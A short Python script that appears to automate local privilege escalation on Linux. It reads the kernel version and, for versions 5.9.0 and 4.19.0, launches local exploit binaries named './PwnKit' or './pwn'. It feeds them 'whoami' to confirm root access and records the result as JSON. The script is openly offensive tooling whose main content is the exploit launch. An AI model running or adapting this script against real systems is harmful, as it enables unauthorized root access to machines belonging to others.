import subprocess
import re
import json

def kernel_exploit():
    p = subprocess.Popen(['uname', '-r'], stdout=subprocess.PIPE).communicate()[0]
    kernel_name = p.decode('utf-8')

    global kernel_name1
    kernel_name1 = kernel_name.join(re.findall(r"[0-9]+\.[0-9]+\.[0-9]+",kernel_name))


    if kernel_name1 == "5.9.0":
        args = ["./PwnKit"]
        child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
        print(child_process_output)

    elif kernel_name1 == "4.19.0":
        args = ["./pwn"]
        child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
        print(child_process_output)

def file_to_Json():
    file = open('output.txt','r')
    text = file.read()
    dict = {kernel_name1:text}
    for key, value in dict.items():
        dict[key] = value.rstrip()
    json_text = json.dumps((dict))
    print(json_text)

kernel_exploit()
file_to_Json()